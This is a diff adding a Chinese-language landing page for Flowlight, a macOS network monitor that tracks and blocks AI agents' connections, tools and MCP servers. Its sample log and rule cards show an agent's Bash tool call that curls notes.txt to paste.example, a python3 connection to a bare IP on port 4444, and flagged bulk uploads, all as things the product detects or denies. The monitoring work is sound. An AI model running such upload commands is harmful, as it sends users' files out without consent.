@@ -1,0 +1,681 @@
+<!doctype html>
+<html lang="zh-Hans">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Flowlight——面向 macOS 的应用级网络监控</title>
+<meta name="description" content="Flowlight 是面向 macOS 的开源应用级网络监控工具，能看清每个应用的连接去向，尤其看得清 AI 代理、它们的工具和 MCP 服务器。">
+<link rel="canonical" href="https://flowlight.xinbetween.com/zh-Hans/">
+<link rel="alternate" hreflang="en" href="https://flowlight.xinbetween.com/">
+<link rel="alternate" hreflang="de" href="https://flowlight.xinbetween.com/de/">
+<link rel="alternate" hreflang="es" href="https://flowlight.xinbetween.com/es/">
+<link rel="alternate" hreflang="fr" href="https://flowlight.xinbetween.com/fr/">
+<link rel="alternate" hreflang="it" href="https://flowlight.xinbetween.com/it/">
+<link rel="alternate" hreflang="ja" href="https://flowlight.xinbetween.com/ja/">
+<link rel="alternate" hreflang="ko" href="https://flowlight.xinbetween.com/ko/">
+<link rel="alternate" hreflang="pt-PT" href="https://flowlight.xinbetween.com/pt-PT/">
+<link rel="alternate" hreflang="zh-Hans" href="https://flowlight.xinbetween.com/zh-Hans/">
+<link rel="alternate" hreflang="zh-Hant" href="https://flowlight.xinbetween.com/zh-Hant/">
+<link rel="alternate" hreflang="x-default" href="https://flowlight.xinbetween.com/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Flowlight">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="Flowlight——面向 macOS 的应用级网络监控">
+<meta property="og:description" content="Flowlight 是面向 macOS 的开源应用级网络监控工具，能看清每个应用的连接去向，尤其看得清 AI 代理、它们的工具和 MCP 服务器。">
+<meta property="og:url" content="https://flowlight.xinbetween.com/zh-Hans/">
+<meta property="og:image" content="https://flowlight.xinbetween.com/assets/social-card.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Flowlight — application-aware network monitoring for macOS, with focused visibility into AI agents">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="theme-color" content="#f4f5f8" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0d0f16" media="(prefers-color-scheme: dark)">
+<link rel="icon" href="../assets/icon.png">
+<link rel="apple-touch-icon" href="../assets/apple-touch-icon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="../assets/site.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://flowlight.xinbetween.com/#website-zh-Hans", "url": "https://flowlight.xinbetween.com/zh-Hans/", "name": "Flowlight", "inLanguage": "zh-Hans", "publisher": {"@id": "https://flowlight.xinbetween.com/#publisher"}}, {"@type": "Organization", "@id": "https://flowlight.xinbetween.com/#publisher", "name": "xinbetween", "url": "https://flowlight.xinbetween.com/", "logo": "https://flowlight.xinbetween.com/assets/icon.png", "sameAs": ["https://github.com/xinbetween/flowlight"]}, {"@type": "SoftwareApplication", "@id": "https://flowlight.xinbetween.com/#app-zh-Hans", "name": "Flowlight", "description": "Flowlight 是面向 macOS 的开源应用级网络监控工具，能看清每个应用的连接去向，尤其看得清 AI 代理、它们的工具和 MCP 服务器。", "url": "https://flowlight.xinbetween.com/zh-Hans/", "applicationCategory": "SecurityApplication", "applicationSubCategory": "Network monitor", "operatingSystem": "macOS 15 or later", "softwareVersion": "0.7.7", "downloadUrl": "https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg", "installUrl": "https://flowlight.xinbetween.com/zh-Hans/docs/#install", "image": "https://flowlight.xinbetween.com/assets/social-card.png", "screenshot": "https://flowlight.xinbetween.com/assets/screenshots/agents.png", "license": "https://www.gnu.org/licenses/gpl-3.0.html", "isAccessibleForFree": true, "publisher": {"@id": "https://flowlight.xinbetween.com/#publisher"}, "offers": {"@type": "Offer", "price": "0", "priceCurrency": "USD", "availability": "https://schema.org/InStock"}}]}</script>
+</head>
+<body>
+<a class="skip" href="#main" style="position:absolute;left:-999px">跳到正文</a>
+<header class="nav">
+  <div class="wrap">
+    <a class="brand" href="../zh-Hans/"><img src="../assets/icon.png" alt="">Flowlight</a>
+    <nav class="nav-links" aria-label="站点">
+      <a href="../zh-Hans/#agents">AI 代理</a>
+      <a href="../zh-Hans/docs/">文档</a>
+      <a href="../zh-Hans/privacy/">隐私</a>
+      <a href="../releases/">版本</a>
+      <a href="../zh-Hans/about/">关于</a>
+      <a href="https://github.com/xinbetween/flowlight">GitHub</a>
+    </nav>
+    <details class="lang">
+      <summary aria-label="语言" title="语言"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.6 2.5 15.4 0 18M12 3c-2.5 2.6-2.5 15.4 0 18"/></svg><span class="lang-name">简体中文</span></summary>
+      <div class="lang-menu"><a href="../" hreflang="en" lang="en">English</a><a href="../de/" hreflang="de" lang="de">Deutsch</a><a href="../es/" hreflang="es" lang="es">Español</a><a href="../fr/" hreflang="fr" lang="fr">Français</a><a href="../it/" hreflang="it" lang="it">Italiano</a><a href="../pt-PT/" hreflang="pt-PT" lang="pt-PT">Português</a><a href="../ja/" hreflang="ja" lang="ja">日本語</a><span lang="zh-Hans" aria-current="true">简体中文</span><a href="../zh-Hant/" hreflang="zh-Hant" lang="zh-Hant">繁體中文</a><a href="../ko/" hreflang="ko" lang="ko">한국어</a></div>
+    </details>
+    <a class="btn btn-primary btn-sm" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">下载</a>
+  </div>
+</header>
+<main id="main">
+  <section class="hero">
+    <div class="wrap">
+      <div>
+        <p class="eyebrow">应用级网络洞察 · macOS 15+</p>
+        <h1 style="margin-top:16px">看清应用的网络活动。<br><span class="flow">读懂你的 AI 代理。</span></h1>
+        <p class="lede">Flowlight 显示哪些应用在联网、去了哪里、传了多少数据。对 AI 代理，它还会追踪工具、
+          MCP 服务器和目标——陌生主机、敏感通道和异常上传就此一眼可见。</p>
+        <div class="cta">
+          <a class="btn btn-primary" href="https://github.com/xinbetween/flowlight/releases/latest/download/Flowlight.dmg">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 4v11m0 0-4.5-4.5M12 15l4.5-4.5M5 20h14"/></svg>
+            下载 macOS 版
+          </a>
+          <a class="btn btn-ghost" href="https://github.com/xinbetween/flowlight">
+            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M12 .5a11.5 11.5 0 0 0-3.64 22.41c.58.1.79-.25.79-.56v-2c-3.2.7-3.88-1.37-3.88-1.37-.52-1.33-1.28-1.69-1.28-1.69-1.05-.72.08-.7.08-.7 1.16.08 1.77 1.19 1.77 1.19 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.56-.29-5.25-1.28-5.25-5.69 0-1.26.45-2.29 1.19-3.1-.12-.29-.52-1.46.11-3.05 0 0 .97-.31 3.17 1.18a11 11 0 0 1 5.77 0c2.2-1.49 3.17-1.18 3.17-1.18.63 1.59.23 2.76.11 3.05.74.81 1.19 1.84 1.19 3.1 0 4.42-2.7 5.4-5.27 5.68.41.36.78 1.06.78 2.14v3.17c0 .31.21.67.8.56A11.5 11.5 0 0 0 12 .5Z"/></svg>
+            在 GitHub 上加星
+          </a>
+          <p class="brew"><code>brew install --cask xinbetween/tap/flowlight</code><button type="button" class="copy" data-copy="brew install --cask xinbetween/tap/flowlight">拷贝</button></p>
+          <p class="meta-row"><span>v0.7.7</span><span>macOS 15+</span><span>通用架构</span><span>GPL-3.0</span><span>无遥测</span></p>
+        </div>
+      </div>
+
+      <div class="log" role="img" aria-label="Flowlight 实时连接日志示例：按应用和域名统计的流量、一条被规则拒绝的连接、护栏拿掉代理的工具、经点对点 Wi-Fi 的 AirDrop，以及一条模拟响应">
+        <div class="log-head"><span class="dot"></span><span class="dot"></span><span class="dot"></span>
+          <span style="margin-left:8px">连接</span><span class="live"><span class="pulse"></span>实时</span></div>
+        <ol id="log">
+          <li><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · https:443</span><span class="bytes up">↑ 1.4 MB</span></li>
+          <li class="tool"><span class="app"></span><span class="note">↳ Bash: curl -s paste.example/up -d @notes.txt</span></li>
+          <li class="block"><span class="app">claude › curl</span><span class="dest"><b>paste.example</b> · https:443</span><span class="bytes up">已拒绝</span>
+            <span class="note">⛔ 规则“Claude Code 不能访问 paste.example”</span></li>
+          <li><span class="app">Chrome</span><span class="dest"><b>www.youtube.com</b> · quic:443</span><span class="bytes down">↓ 9.2 MB</span></li>
+          <li class="flag"><span class="app">codex</span><span class="dest"><b>uploads.paste.example</b> · https:443</span><span class="bytes up">↑ 180 MB</span>
+            <span class="note">⚠ 疑似外泄：1 小时内向非 AI 主机发送 180 MB</span></li>
+          <li class="p2p"><span class="app">sharingd</span><span class="dest"><b>AirDrop · 附近的设备</b> · awdl0</span><span class="bytes up">↑ 4.1 GB</span></li>
+          <li class="guard"><span class="app">claude</span><span class="dest"><b>api.anthropic.com</b> · tools/list</span><span class="bytes down">−3 个工具</span>
+            <span class="note">🛡 护栏：Bash、Write、Edit 从不提供给模型</span></li>
+          <li><span class="app">Slack</span><span class="dest"><b>wss-primary.slack.com</b> · websocket</span><span class="bytes down">↓ 120 KB</span></li>
+          <li class="flag"><span class="app">claude</span><span class="dest"><b>smtp.relay.example</b> · smtp:587</span><span class="bytes up">↑ 2.4 MB</span>
+            <span class="note">⚠ 代理使用了邮件（SMTP 投递）</span></li>
+          <li class="mock"><span class="app">Cursor</span><span class="dest"><b>api2.cursor.sh</b> · POST /v1/chat</span><span class="bytes down">503</span>
+            <span class="note">✎ 由 Flowlight 应答，从未发往上游</span></li>
+        </ol>
+      </div>
+    </div>
+  </section>
+
+  <section class="shot" aria-label="截图">
+    <div class="wrap">
+      <div class="frame"><img src="../assets/screenshots/agents.png?v=c3fae806" width="1600" height="1075"
+        alt="Flowlight 的 AI 代理视图。Claude Code、Cursor、Codex 和一个 Python 脚本逐行列出，显示各自的 AI 提供方、发往别处的流量，以及 SMTP、SSH、FTP、大量上传和裸 IP 的风险标记。"></div>
+      <p class="caption">AI 代理视图：每个代理的模型提供方，以及它联系过的其他一切。图中为演示数据。</p>
+    </div>
+  </section>
+  <section class="band" id="use-cases">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">什么时候该打开 Flowlight</p>
+        <h2>几秒钟就能回答的问题</h2>
+      </div>
+      <div class="cases">
+        <div class="case"><span class="view">AI 代理</span><h3>你在开会，代理还在跑</h3>
+          <p>除了模型提供方，它和它的工具碰过的每一台主机都在列；一旦它离开允许列表、发送邮件，或向新地方上传 100&nbsp;MB，你就会收到警报。</p></div>
+        <div class="case"><span class="view">报告</span><h3>上传量突然飙升，你却不知道为什么</h3>
+          <p>把指针停在峰值上，就看到背后的应用；点一下从小时下钻到分钟，再顺着它找到具体的域名和 IP。</p></div>
+        <div class="case"><span class="view">警报</span><h3>某个新应用开始往外联络</h3>
+          <p>首次连接新域名、连接到非标准端口、流量突增，都会各自触发一条警报，点明是哪个应用，以及触发它的那个数字。</p></div>
+        <div class="case"><span class="view">实时</span><h3>此刻有东西正把带宽吃满</h3>
+          <p>每秒更新的流量最高应用排行，带上每个应用最忙的目标，菜单栏里还有实时速率。</p></div>
+        <div class="case"><span class="view">报告</span><h3>这个月的热点流量莫名其妙就没了</h3>
+          <p>切到月视图并按应用分组。用得最多的那个就在第一行；需要凭据时还能导出 CSV。</p></div>
+        <div class="case"><span class="view">报告 · 目标</span><h3>你需要审计数据流向</h3>
+          <p>按目标分组，看每个与某域名通信的应用；按 IP 分组，看某个地址背后究竟是什么。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="views">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">应用内部</p>
+        <h2>八个视图，各答一问</h2>
+      </div>
+      <div class="views">
+        <div class="view-card"><span class="glyph live"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg></span>
+          <h3>实时</h3><p>现在什么在动？按应用的速率、最近两分钟、最忙的目标。</p><span class="keys">⌘1</span></div>
+        <div class="view-card"><span class="glyph ai-agents"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10.5 4.5l1.7 4.8L17 11l-4.8 1.7-1.7 4.8-1.7-4.8L4 11l4.8-1.7z"/><path d="M18 14.5l.8 2.2 2.2.8-2.2.8-.8 2.2-.8-2.2-2.2-.8 2.2-.8z"/></svg></span>
+          <h3>AI 代理</h3><p>我的代理除了调用模型还在做什么？提供方、其他主机、风险标记。</p><span class="keys">⌘2</span></div>
+        <div class="view-card"><span class="glyph reports"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 20V10M10 20V4M16 20v-7M22 20H2"/></svg></span>
+          <h3>报告</h3><p>流量究竟去了哪？从秒到年，按应用、目标或 IP 分组，配图表与 CSV。</p><span class="keys">⌘3</span></div>
+        <div class="view-card"><span class="glyph alerts"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 3 2 20h20L12 3z"/><path d="M12 10v4M12 17.5v.01"/></svg></span>
+          <h3>警报</h3><p>哪里不对？逐应用、讲得清道理的警报，带上目标和阈值。</p><span class="keys">⌘4</span></div>
+        <div class="view-card"><span class="glyph rules"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 11V6a2 2 0 0 1 4 0v5M9 11V4a2 2 0 0 1 4 0v7M13 11V6a2 2 0 0 1 4 0v8"/><path d="M17 11v3a5 5 0 0 1-5 5h-1a6 6 0 0 1-6-6v-2"/></svg></span>
+          <h3>规则</h3><p>我拒绝过什么，真的生效了吗？每条规则、各自阻止了什么，以及每次判定的流水。</p><span class="keys">⌘5</span></div>
+        <div class="view-card"><span class="glyph ask"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12a8 8 0 0 1-8 8H7l-4 3v-5.5A8 8 0 1 1 21 12z"/></svg></span>
+          <h3>提问</h3><p>用日常语言提问，从历史数据里作答——下方列出它执行过的每一条查询。</p><span class="keys">⌘7</span></div>
+        <div class="view-card"><span class="glyph devices"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 9a10 10 0 0 1 14 0M8 12.5a6 6 0 0 1 8 0M11 16h2"/></svg></span>
+          <h3>设备</h3><p>蓝牙和 USB：配对了什么、接入了什么、什么时候变的。默认关闭，你开了才记录。</p><span class="keys">⌘8</span></div>
+        <div class="view-card"><span class="glyph inspect"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3" y="4" width="18" height="12" rx="2"/><path d="M8 20h8M12 16v4"/><path d="M10 10a2 2 0 1 1 4 0v1"/></svg></span>
+          <h3>检查</h3><p>可选。代理究竟发出了什么，是哪次工具调用引起的？解密后的请求、工具调用和结果。</p><span class="keys">⌘6</span></div>
+      </div>
+    </div>
+  </section>
+
+
+  <section class="band" id="capture">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">捕获</p>
+        <h2>看得见应用的网络活动</h2>
+        <p class="lede">Flowlight 把观察到的 TCP 与 UDP 活动归到应用上，并把目标、协议和字节数记录在本地。
+          覆盖范围取决于所选的捕获来源和可获得的主机名信息。</p>
+      </div>
+      <div class="pair">
+        <div class="fact">
+          <span class="figure">按应用归属</span>
+          <p>应用、命令行工具和后台服务按进程归属，包括已识别的代理子进程。</p>
+        </div>
+        <div class="fact">
+          <span class="figure">解析出的主机名</span>
+          <p>从观察到的 TLS 服务器名和 DNS 响应中学习。没有主机名可用时，Flowlight 可以选择性地识别网络的所有者。</p>
+        </div>
+        <div class="fact">
+          <span class="figure">1 秒 <small>→ 1 年</small></span>
+          <p>从秒缩放到年。按应用、按目标或按 IP 分组。把指针停在峰值上，就知道背后是哪个应用。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="agents">
+    <div class="wrap agents">
+      <div class="section-head" style="margin:0">
+        <p class="eyebrow">AI 代理监视</p>
+        <h2>看住 AI 代理如何使用网络</h2>
+        <p class="lede">Flowlight 能按名字认出 16 种代理，并对联系 27 家已知 LLM API 提供方的
+          其他进程加以归类。浏览器流量不参与自动代理归类。</p>
+        <div class="agent-list" aria-label="已识别的代理">
+          <span class="chip">Claude Code</span><span class="chip">Codex</span><span class="chip">Cursor</span>
+          <span class="chip">Windsurf</span><span class="chip">GitHub Copilot</span><span class="chip">Gemini CLI</span>
+          <span class="chip">Aider</span><span class="chip">Goose</span><span class="chip">OpenCode</span>
+          <span class="chip">Ollama</span><span class="chip">LM Studio</span><span class="chip">ChatGPT</span>
+          <span class="chip">Claude</span><span class="chip">Zed</span><span class="chip">Perplexity</span><span class="chip">ZCode</span>
+          <span class="chip">+ 任何调用 LLM API 的程序</span>
+        </div>
+      </div>
+      <div class="rules">
+        <div class="rule">
+          <span class="sev critical">⚠ 严重</span>
+          <div><h3>违反允许列表</h3>
+            <p>“Claude Code 只能与 GitHub 和 npm 通信，别的都不行。”添加域名、IP 或地址段，也可以从预设开始。
+              其他任何目标都会触发警报，并提供一键<b>允许</b>——你要求时，网络扩展会直接拒绝这个连接，
+              而不只是把它报告出来。</p>
+            <p class="example">Claude Code › curl 联系了 paste.example:443，它不在 Claude Code 的允许列表上</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⛔ 拒绝</span>
+          <div><h3>规则管多久，你说了算</h3>
+            <p>指定一个应用、一个代理、一个目标或单个 URL 就能阻止它——在发现它的那一行右键即可。
+              可以永久生效、到某个时间、到 Flowlight 退出，或只在选定的时段内生效；有一个暂停开关，每次拒绝也都留着出口。
+              最具体的规则胜出，打平时以阻止为准。</p>
+            <p class="example">Cursor ⇥ raw.githubusercontent.com · 已拒绝 4 次 · 工作日 18:00–09:00</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⛔ 拒绝</span>
+          <div><h3>给代理的工具加护栏</h3>
+            <p>阻止一个 MCP 服务器、它的某个工具，或某个资源。被拒绝的工具会从代理发给模型的清单里移除，
+              模型根本看不到它——没有需要争辩的拒绝，也没有重试循环。它需要 HTTPS 检查；而且它不是沙盒：
+              Flowlight 明说这一点，而不是含糊其辞。</p>
+            <p class="example">Claude Code：没有 Bash，没有 write* · 今天的声明里被拿掉了 12 个工具</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">↳ 归属</span>
+          <div><h3>工具与 MCP 服务器</h3>
+            <p>代理的 shell 工具跑起来的 curl、git 或 npm，以及它启动的 MCP 服务器，都算作该代理的流量，名字取自它自己的 MCP 配置。</p>
+            <p class="example">api.github.com · 经由 github MCP &nbsp;·&nbsp; paste.example · 经由 curl</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">⌕ 需自行开启</span>
+          <div><h3>工具调用，取自模型自己的响应</h3>
+            <p>对受支持的提供方，以及经 HTTPS 检查转发的应用，Flowlight 可以记录声明的工具、模型请求的工具调用和返回的结果，再把某个工具发出的网络请求与引发它的那次调用对应起来。</p>
+            <p class="example">curl → paste.example:443 &nbsp;←&nbsp; Bash: curl -s https://paste.example/up -d @notes.txt</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">⌕ 磁盘上</span>
+          <div><h3>每个代理被配置成做什么</h3>
+            <p>经你同意，Flowlight 会读取代理自己的配置：技能、子代理、斜杠命令、钩子、权限规则和 MCP 服务器。只有名字，绝不含你的代码，而且什么都不会离开这台 Mac。</p>
+            <p class="example">Notification 钩子 → curl -s -d … https://ntfy.sh/… &nbsp;·&nbsp; allow: Bash(curl:*)</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⚠ 严重</span>
+          <div><h3>敏感通道</h3>
+            <p>代理发送邮件、传输文件、打开 SSH 或远程桌面、走隧道或代理，或者连接数据库。</p>
+            <p class="example">Claude Code 通过 SMTP-SUBMISSION 连到 smtp.relay.example:587，发送 2.4 MB</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev critical">⚠ 严重</span>
+          <div><h3>可能的数据外泄</h3>
+            <p>每小时有超过 100 MB 发往并非 AI 提供方的主机。</p>
+            <p class="example">Codex 在过去一小时内向非 AI 主机上传了 180 MB：uploads.paste.example</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev warning">▲ 警告</span>
+          <div><h3>无名主机</h3>
+            <p>通过不常见的端口连接到一个没有主机名的裸 IP 地址。</p>
+            <p class="example">python3 连接了 203.0.113.45:4444（tcp），没有主机名</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev warning">▲ 警告</span>
+          <div><h3>你离开时仍在活动</h3>
+            <p>键盘和鼠标已有 15 分钟没有输入，数据却还在传。</p>
+            <p class="example">Codex 在你离开期间的最近一分钟里传输了 48 MB（37 分钟无输入）</p></div>
+        </div>
+        <div class="rule">
+          <span class="sev info">ⓘ 提示</span>
+          <div><h3>新目标，更早知道</h3>
+            <p>代理有 1 小时学习期，之后才开始发新域名警报（其他应用是 24 小时）。每个阈值都可以调。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="protocols">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">覆盖范围</p>
+        <h2>108 种协议，归入 13 个族</h2>
+        <p class="lede">按端口以及线路上的头几个字节识别（TLS 握手、HTTP 方法、邮件和 SSH 问候、SOCKS 请求）。
+          标着 <b style="color:var(--critical)">外发通道</b> 的族，就是代理规则盯着的那些。</p>
+      </div>
+      <div class="families">
+        <div class="family"><header><h3>网页</h3><span class="count">9</span></header>
+          <div class="protos"><span>HTTP</span><span>HTTPS</span><span>HTTP/2</span><span>QUIC · HTTP/3</span><span>WebSocket</span><span>TLS</span><span>HTTP 代理</span></div></div>
+        <div class="family egress"><header><h3>邮件</h3><span class="tag">外发通道</span></header>
+          <div class="protos"><span>SMTP</span><span>Submission 587</span><span>SMTPS</span><span>IMAP</span><span>IMAPS</span><span>POP3</span><span>POP3S</span></div></div>
+        <div class="family egress"><header><h3>文件传输</h3><span class="tag">外发通道</span></header>
+          <div class="protos"><span>FTP</span><span>FTPS</span><span>TFTP</span><span>SFTP</span><span>SMB</span><span>AFP</span><span>NFS</span><span>rsync</span><span>git</span><span>svn</span></div></div>
+        <div class="family egress"><header><h3>远程访问</h3><span class="tag">外发通道</span></header>
+          <div class="protos"><span>SSH</span><span>RDP</span><span>VNC</span><span>Telnet</span><span>TeamViewer</span></div></div>
+        <div class="family egress"><header><h3>VPN、代理与隧道</h3><span class="tag">外发通道</span></header>
+          <div class="protos"><span>WireGuard</span><span>OpenVPN</span><span>IPsec</span><span>L2TP</span><span>PPTP</span><span>Tailscale</span><span>SOCKS5</span><span>Tor</span></div></div>
+        <div class="family egress"><header><h3>数据库与缓存</h3><span class="tag">外发通道</span></header>
+          <div class="protos"><span>Postgres</span><span>MySQL</span><span>SQL Server</span><span>Oracle</span><span>Redis</span><span>MongoDB</span><span>Cassandra</span><span>Elasticsearch</span><span>Memcached</span></div></div>
+        <div class="family egress"><header><h3>点对点</h3><span class="tag">外发通道</span></header>
+          <div class="protos"><span>BitTorrent</span></div></div>
+        <div class="family"><header><h3>名称解析</h3><span class="count">8</span></header>
+          <div class="protos"><span>DNS</span><span>DNS over TLS</span><span>DNS over HTTPS</span><span>DNS over QUIC</span><span>mDNS</span><span>LLMNR</span><span>NetBIOS</span><span>WHOIS</span></div></div>
+        <div class="family"><header><h3>消息与队列</h3><span class="count">12</span></header>
+          <div class="protos"><span>MQTT</span><span>AMQP</span><span>Kafka</span><span>NATS</span><span>XMPP</span><span>IRC</span><span>NNTP</span></div></div>
+        <div class="family"><header><h3>语音、视频与流媒体</h3><span class="count">5</span></header>
+          <div class="protos"><span>SIP</span><span>SIPS</span><span>STUN</span><span>RTSP</span><span>Zoom media</span></div></div>
+        <div class="family"><header><h3>网络服务</h3><span class="count">19</span></header>
+          <div class="protos"><span>NTP</span><span>DHCP</span><span>SNMP</span><span>Syslog</span><span>SSDP</span><span>Kerberos</span><span>LDAP</span><span>IPP</span><span>BGP</span></div></div>
+        <div class="family"><header><h3>推送与开发者服务</h3><span class="count">6</span></header>
+          <div class="protos"><span>APNs</span><span>FCM</span><span>Docker</span><span>Kubernetes</span><span>Ollama</span></div></div>
+      </div>
+      <p class="footnote">启用网络扩展后，Flowlight 会观察符合条件的 TCP 与 UDP 流。ICMP、其他裸 IP 协议
+        和部分系统流量不在覆盖范围内。除非明确把某个应用交给 HTTPS 检查转发，加密的载荷始终保持加密。</p>
+    </div>
+  </section>
+
+  
+  <section class="band" id="compare">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">横向对比</p>
+        <h2>为别的工具跳过的那个问题而做</h2>
+        <p class="lede">Flowlight 负责看见和解释，而且——在你要求之后——负责拒绝：一个目标、一个 URL，
+          或者代理本不该拥有的一个工具。</p>
+      </div>
+      <div class="table-wrap">
+        <table class="compare">
+          <thead><tr><th></th><th class="us">Flowlight</th><th>Activity Monitor</th><th>防火墙<br><small>如 Little Snitch、LuLu</small></th><th>抓包分析器<br><small>如 Wireshark</small></th></tr></thead>
+          <tbody>
+            <tr><td>是哪个应用发的</td><td class="us yes">是</td><td class="yes">是</td><td class="yes">是</td><td class="no">否</td></tr>
+            <tr><td>发到了哪个域名</td><td class="us yes">是，来自 SNI 和 DNS</td><td class="no">否</td><td class="yes">是</td><td class="yes">是，逐包</td></tr>
+            <tr><td>从秒到年的历史</td><td class="us yes">是</td><td class="no">否</td><td class="part">视产品而定</td><td class="part">抓包文件</td></tr>
+            <tr><td>面向 AI 代理的规则</td><td class="us yes">是</td><td class="no">否</td><td class="no">否</td><td class="no">否</td></tr>
+            <tr><td>代理的工具调用，并与其流量关联</td><td class="us yes">是，需自行开启</td><td class="no">否</td><td class="no">否</td><td class="no">否</td></tr>
+            <tr><td>阻止连接</td><td class="us yes">是，配合网络扩展</td><td class="no">否</td><td class="yes">是</td><td class="no">否</td></tr>
+            <tr><td>阻止代理的工具，而不只是它的流量</td><td class="us yes">是，需自行开启</td><td class="no">否</td><td class="no">否</td><td class="no">否</td></tr>
+            <tr><td>免费且开源</td><td class="us yes">是，GPL-3.0</td><td class="part">系统自带</td><td class="part">视产品而定</td><td class="yes">是</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <section class="band" id="about">
+    <div class="wrap about">
+      <div style="display:grid;gap:16px">
+        <p class="eyebrow">Flowlight 为何存在</p>
+        <blockquote>你的工具如今会自己做决定。它们这么做的时候，你应该看得见<span>数据去了哪里</span>。</blockquote>
+      </div>
+      <div class="prose">
+        <p>编程代理会读你的文件、执行命令、调用工具，而其中任何一个工具都可能打开一个 socket。2026 年 9 月，
+          有人发现一款 AI 编程应用把用户的整个工作区连 Git 历史一起打包，在后台上传。
+          抓到它的那位研究者，只是因为缓存文件夹把磁盘吃光了才注意到。</p>
+        <p>上传的内容是加密的，但真正要紧的事实并没有：哪个应用、哪台主机、多少兆字节、什么时候。
+          这些 macOS 本来就知道。Flowlight 把它们放到屏幕上，留下历史，并标出不对劲的地方。</p>
+        <p><a href="../zh-Hans/about/">读完整的故事 →</a></p>
+      </div>
+    </div>
+  </section>
+<section class="band" id="inspect">
+    <div class="wrap">
+      <div class="section-head">
+        <p class="eyebrow">HTTPS 检查 · 可选</p>
+        <h2>把受支持的工具调用与网络请求对上</h2>
+        <p class="lede">默认关闭。打开后，Flowlight 会成为一个本地代理，使用在你 Mac 上生成的专属证书颁发机构。
+          从受检查的终端启动代理，代理及其工具的受支持 HTTP 流量就会被解密，并附上模型请求的工具调用和返回的结果。</p>
+      </div>
+      <figure class="detail-shot"><div class="frame"><img src="../assets/screenshots/inspect.png?v=4a7a2ce7" width="1600" height="1075" loading="lazy"
+        alt="Flowlight 的检查视图：一列已解密的 Claude Code 请求及其工具调用，以及 curl 向 paste.example 上传的详情——由运行它的那次 Bash 工具调用发起，请求体里正是上传的笔记"></div>
+        <figcaption><b>我的笔记去哪了？</b>curl 向 paste.example 的上传，一路追到模型要求执行的那条 Bash 命令，
+          连它发出的请求体一起。</figcaption></figure>
+      <div class="screens" style="margin-top:32px">
+        <figure><div class="frame"><img src="../assets/screenshots/agent-tools.png?v=2dd743f6" width="1600" height="622" loading="lazy"
+          alt="Claude Code 的工具标签页：Bash、Read 和两个 MCP 工具，附带说明以及模型各自调用了多少次"></div>
+          <figcaption><b>代理提供给模型的每一个工具。</b>代理每一轮都会声明自己的工具，所以 Flowlight 把它们全部列出，
+            并区分模型真正用过的和从未碰过的。</figcaption></figure>
+        <figure><div class="frame"><img src="../assets/screenshots/mcp-servers.png?v=0e34adfb" width="1600" height="622" loading="lazy"
